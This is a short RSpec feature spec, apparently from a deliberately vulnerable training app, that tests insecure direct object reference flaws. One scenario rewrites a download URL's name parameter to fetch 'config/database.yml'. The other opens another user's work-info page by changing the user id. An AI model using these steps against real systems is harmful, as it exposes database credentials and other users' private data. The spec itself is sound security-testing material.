require 'spec_helper'

feature 'insecure direct object reference' do
  before do
    UserFixture.reset_all_users
    @normal_user = UserFixture.normal_user
  end

  scenario 'attack one' do
    login(@normal_user)

    visit "/users/#{@normal_user.user_id}/benefit_forms"
    download_url = first('.widget-body a')[:href]
    visit download_url.sub(/name=(.*?)&/, 'name=config/database.yml&')

    pending(:if => verifying_fixed?) {
      page.status_code.should == 200
      page.response_headers['Content-Disposition'].should include('database.yml')
      page.response_headers['Content-Length'].should == '709'
    }
  end

  scenario 'attack two' do
    login(@normal_user)

    @normal_user.user_id.should_not == 2
    visit '/users/2/work_info'

    pending(:if => verifying_fixed?) { first('td').text.should == 'Jack Mannino' }
  end
end